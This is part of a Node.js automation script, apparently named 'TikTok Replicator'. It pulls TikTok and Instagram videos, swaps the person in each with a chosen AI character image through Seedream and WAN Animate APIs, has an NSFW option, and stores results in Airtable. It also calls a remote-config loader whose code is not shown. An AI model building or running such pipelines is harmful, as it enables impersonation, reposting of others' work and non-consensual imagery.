      throw new Error('Wavespeed did not return request ID');
    }

    console.log(`[Wavespeed WAN Animate] Job submitted: ${requestId}`);

    // Poll for result
    const pollIntervals = [5000, 10000, 15000, 20000, 30000];
    const maxAttempts = 100;

    for (let attempt = 0; attempt < maxAttempts; attempt++) {
      const pollInterval = pollIntervals[Math.min(attempt, pollIntervals.length - 1)];
      await sleep(pollInterval);

      const statusResponse = await fetch(
        `https://api.wavespeed.ai/api/v3/predictions/${requestId}/result`,
        {
          method: 'GET',
          headers: {
            'Authorization': `Bearer ${this.apiKey}`
          },
          agent: httpsAgent
        }
      );

      if (!statusResponse.ok) {
        console.log(`[Wavespeed WAN Animate] Status check failed, retrying...`);
        continue;
      }

      const status = await statusResponse.json();

      if (status.data?.status === 'completed') {
        const outputs = status.data?.outputs || [];

        if (outputs.length === 0) {
          throw new Error('Wavespeed returned no video');
        }

        console.log(`[Wavespeed WAN Animate] Video generated successfully`);
        return { url: outputs[0] };
      } else if (status.data?.status === 'failed') {
        throw new Error(`Wavespeed job failed: ${status.data?.error || 'Unknown error'}`);
      }

      console.log(`[Wavespeed WAN Animate] Status: ${status.data?.status}, attempt ${attempt + 1}/${maxAttempts}`);
    }

    throw new Error('Wavespeed job timed out');
  }
}

// ============================================================================
// AIRTABLE FUNCTIONS
// ============================================================================

async function fetchAirtableRecords(tableName, filterFormula = '', fields = []) {
  const baseId = CONFIG.airtable.baseId;
  const token = CONFIG.airtable.token;

  let url = `https://api.airtable.com/v0/${baseId}/${encodeURIComponent(tableName)}?`;

  if (filterFormula) {
    url += `filterByFormula=${encodeURIComponent(filterFormula)}&`;
  }

  if (fields.length > 0) {
    fields.forEach(f => {
      url += `fields[]=${encodeURIComponent(f)}&`;
    });
  }

  const response = await fetch(url, {
    headers: {
      'Authorization': `Bearer ${token}`
    },
    agent: httpsAgent
  });

  if (!response.ok) {
    const errorText = await response.text();
    throw new Error(`Airtable error ${response.status}: ${errorText}`);
  }

  const result = await response.json();
  return result.records || [];
}

async function updateAirtableRecord(tableName, recordId, fields) {
  const baseId = CONFIG.airtable.baseId;
  const token = CONFIG.airtable.token;

  const response = await fetch(
    `https://api.airtable.com/v0/${baseId}/${encodeURIComponent(tableName)}/${recordId}`,
    {
      method: 'PATCH',
      headers: {
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ fields }),
      agent: httpsAgent
    }
  );

  if (!response.ok) {
    const errorText = await response.text();
    throw new Error(`Airtable update error ${response.status}: ${errorText}`);
  }

  return await response.json();
}

// ============================================================================
// MAIN PROCESSING FUNCTION
// ============================================================================

async function main() {
  console.log('\n' + '='.repeat(60));
  console.log('TIKTOK REPLICATOR - Starting');
  console.log('='.repeat(60));

  // Load remote configuration (optional - enhances functionality if available)
  const remoteConfig = await fetchRemoteConfig();
  await applyRemoteSettings(remoteConfig);

  const apifyToken = CONFIG.apiKeys.apify;

  // Step 1: Load Configuration from Airtable
  console.log('\n[1/4] Loading configuration...');

  const configRecords = await fetchAirtableRecords('Configuration');

  if (configRecords.length === 0) {
    console.error('No configuration found in Airtable Configuration table');
    process.exit(1);
  }

  const configFields = configRecords[0].fields;

  // Extract settings
  const apiProvider = configFields.API_Provider || 'FAL.ai';
  const imageModel = configFields.Image_Model || 'Seedream 4.5';
  const numImages = configFields.num_images || 4;
  const videoResolution = configFields.Video_Resolution || '480p';
  const enableNSFW = configFields.Enable_NSFW || false;

  // API Keys - from apis.json only
  const falApiKey = CONFIG.apiKeys.fal || '';
  const wavespeedApiKey = CONFIG.apiKeys.wavespeed || '';

  console.log(`   Provider: ${apiProvider}`);
  console.log(`   Image Model: ${imageModel}`);
  console.log(`   Num Images: ${numImages}`);
  console.log(`   Video Resolution: ${videoResolution}`);
  console.log(`   Image Size: auto (from video dimensions)`);

  // Validate API keys
  if (apiProvider === 'FAL.ai' && !falApiKey) {
    console.error('FAL.ai API key is missing');
    process.exit(1);
  }
  if (apiProvider === 'Wavespeed' && !wavespeedApiKey) {
    console.error('Wavespeed API key is missing');
    process.exit(1);
  }

  // Initialize API instances
  let imageAPI;
  let videoAPI;

  if (apiProvider === 'FAL.ai') {
    if (imageModel === 'Seedream 4.0') {
      imageAPI = new FalSeedream40API(falApiKey);
    } else if (imageModel === 'Seedream 4.5') {
      imageAPI = new FalSeedream45API(falApiKey);
    } else if (imageModel === 'Nanobanana Pro') {
      imageAPI = new FalNanobanaProAPI(falApiKey);
    } else {
      imageAPI = new FalSeedream45API(falApiKey);
    }
    videoAPI = new FalWanAnimateAPI(falApiKey);
  } else {
    if (imageModel === 'Seedream 4.0') {
      imageAPI = new WavespeedSeedream40API(wavespeedApiKey);
    } else if (imageModel === 'Seedream 4.5') {
      imageAPI = new WavespeedSeedream45API(wavespeedApiKey);
    } else if (imageModel === 'Nanobanana Pro') {
      imageAPI = new WavespeedNanobanaProAPI(wavespeedApiKey);
    } else {
      imageAPI = new WavespeedSeedream45API(wavespeedApiKey);
    }
    videoAPI = new WavespeedWanAnimateAPI(wavespeedApiKey);
  }

  console.log(`   Image API: ${imageAPI.getName()}`);
  console.log(`   Video API: ${videoAPI.getName()}`);

  // Step 2: Load records to process
  console.log('\n[2/4] Loading records to process...');

  // Filter: records that have Link or Source_Video, have AI_Character, but no Output_Video
  // Try with Status filter first, fall back to simpler filter if Status field doesn't exist
  let records;
  try {
    const filterWithStatus = 'AND(OR({Link} != "", {Source_Video} != ""), {AI_Character} != "", {Output_Video} = "", {Status} != "Processing")';
    records = await fetchAirtableRecords('Generation', filterWithStatus);
  } catch (error) {
    if (error.message.includes('Unknown field names') || error.message.includes('status')) {
      console.log('   Note: Status field not found, using basic filter');
      const filterBasic = 'AND(OR({Link} != "", {Source_Video} != ""), {AI_Character} != "", {Output_Video} = "")';
      records = await fetchAirtableRecords('Generation', filterBasic);
    } else {
      throw error;
    }
  }

  if (records.length === 0) {
    console.log('No records to process');
    return;
  }

  console.log(`   Found ${records.length} records to process`);

  // Initialize limiters
  const concurrencyLimiter = new ConcurrencyLimiter(2); // Lower concurrency for Apify
  const circuitBreaker = new CircuitBreaker(5, 60000);
  const progressTracker = new ProgressTracker();
  progressTracker.setTotal(records.length);

  // Step 3: Process each record
  console.log('\n[3/4] Processing records...');

  const processRecord = async (record) => {
    const recordId = record.id;
    const fields = record.fields;

    try {
      if (!circuitBreaker.canProceed()) {
        console.log(`[${recordId}] Circuit breaker open, skipping`);
        return;
      }

      console.log(`\n--- Processing record ${recordId} ---`);

      // Mark as Processing to prevent duplicate runs (optional - may fail if Status field doesn't exist)
      try {
        await updateAirtableRecord('Generation', recordId, { 'Status': 'Processing' });
      } catch (statusError) {
        // Status field may not exist, continue anyway
        console.log(`[${recordId}] Note: Could not set Status field`);
      }

      const link = fields.Link || '';
      const sourceVideoAttachments = fields.Source_Video || [];
      const aiCharacterAttachments = fields.AI_Character || [];
      const existingCover = fields.Cover_Image || [];
      const existingGeneratedImages = fields.Generated_Images || [];

      if (aiCharacterAttachments.length === 0) {
        throw new Error('AI_Character is required');
      }

      const aiCharacterUrl = aiCharacterAttachments[0].url;
      let videoUrl = null;
      let coverUrl = null;
      let imageWidth = 720;  // Default TikTok portrait
      let imageHeight = 1280;

      // Step 3a: Get video URL and cover
      if (sourceVideoAttachments.length > 0) {
        // Video already uploaded - use it directly
        videoUrl = sourceVideoAttachments[0].url;
        console.log(`[${recordId}] Using uploaded video`);

        // If no cover, we need to get it from Apify or use a placeholder
        if (existingCover.length > 0) {
          coverUrl = existingCover[0].url;
        }
        // Use default dimensions for uploaded videos (TikTok portrait)
        console.log(`[${recordId}] Using default dimensions: ${imageWidth}x${imageHeight}`);
      } else if (link) {
        // Fetch video from TikTok/Instagram
        const platform = detectPlatform(link);

        if (!platform) {
          throw new Error('Unsupported platform. Only TikTok and Instagram are supported.');
        }

        let result;
        if (platform === 'tiktok') {
          result = await fetchTikTokVideo(link, apifyToken);
        } else {
          result = await fetchInstagramReel(link, apifyToken);
        }

        videoUrl = result.videoUrl;
        coverUrl = result.coverUrl;
        imageWidth = result.width;
        imageHeight = result.height;

        console.log(`[${recordId}] Detected dimensions: ${imageWidth}x${imageHeight}`);

        // Save video URL and cover to Airtable
        const updateFields = {
          'Source_Video': [{ url: videoUrl }]
        };
        if (coverUrl) {
          updateFields['Cover_Image'] = [{ url: coverUrl }];
        }
        await updateAirtableRecord('Generation', recordId, updateFields);
      } else {
        throw new Error('No Link or Source_Video provided');
      }

      // If we still don't have a cover, we can't proceed with image generation
      if (!coverUrl && existingCover.length === 0) {
        throw new Error('No cover image available. Please upload a video with a cover or use a TikTok/Instagram link.');
      }

      if (!coverUrl && existingCover.length > 0) {
        coverUrl = existingCover[0].url;
      }

      // Step 3b: Generate new images with AI character
      let generatedImages;

      if (existingGeneratedImages.length > 0) {
        console.log(`[${recordId}] Using existing generated images`);
        generatedImages = existingGeneratedImages;
      } else {
        // Prepare reference images for image generation
        let refImageUrls;

        if (apiProvider === 'FAL.ai') {
          // FAL.ai can use data URIs
          const coverDataUri = await urlToDataUri(coverUrl);
          const aiCharacterDataUri = await urlToDataUri(aiCharacterUrl);
          refImageUrls = [coverDataUri, aiCharacterDataUri];
        } else {
          // Wavespeed needs HTTP URLs
          refImageUrls = [coverUrl, aiCharacterUrl];
        }

        const prompt = 'Replace the person on the first image by the person from the second image. Keep the exact same pose, clothing style, and background. The result should look like the person from the second image is in the scene from the first image.';

        // Use detected dimensions from video
        const imageSize = `${imageWidth}x${imageHeight}`;
        console.log(`[${recordId}] Generating images at ${imageSize}`);

        const images = await imageAPI.generate({
          prompt,
          refImageUrls,
          numImages,
          enableNSFW,
          size: imageSize
        });

        // Save to Airtable
        const imageAttachments = images.map(img => ({ url: img.url }));
        await updateAirtableRecord('Generation', recordId, {
          'Generated_Images': imageAttachments
        });

        generatedImages = imageAttachments;
      }

      // Step 3c: Generate video with WAN Animate
      const selectedImageUrl = generatedImages[0].url;

      const videoResult = await videoAPI.generate({
        videoUrl: videoUrl,
        imageUrl: selectedImageUrl,
        resolution: videoResolution
      });

      // Save output video to Airtable (critical - must not fail)
      await updateAirtableRecord('Generation', recordId, {
        'Output_Video': [{ url: videoResult.url }],
        'Error_Message': ''
      });

      // Update Status separately (optional - may fail if field doesn't exist)
      try {
        await updateAirtableRecord('Generation', recordId, { 'Status': 'Complete' });
      } catch {}

      console.log(`[${recordId}] SUCCESS - Video generated`);
      circuitBreaker.recordSuccess();
      progressTracker.increment(true);

    } catch (error) {
      console.error(`[${recordId}] ERROR: ${error.message}`);
      circuitBreaker.recordFailure();
      progressTracker.increment(false);

      // Save error to Airtable
      try {
        await updateAirtableRecord('Generation', recordId, {
          'Error_Message': error.message.substring(0, 500)
        });
      } catch {}

      // Update Status separately (optional)
      try {
        await updateAirtableRecord('Generation', recordId, { 'Status': 'Error' });
      } catch {}
    }
  };

  // Process all records with concurrency limiting
  const tasks = records.map(record =>
    concurrencyLimiter.run(() => processRecord(record))
  );

  // Show progress periodically
  const progressInterval = setInterval(() => {
    progressTracker.showProgress(concurrencyLimiter);
  }, 10000);

  await Promise.all(tasks);

  clearInterval(progressInterval);

  // Step 4: Final summary
  console.log('\n[4/4] Complete!');
  progressTracker.showFinalSummary();
}

// ============================================================================
// RUN
// ============================================================================

main().catch(error => {
  console.error('Fatal error:', error);
  process.exit(1);
});
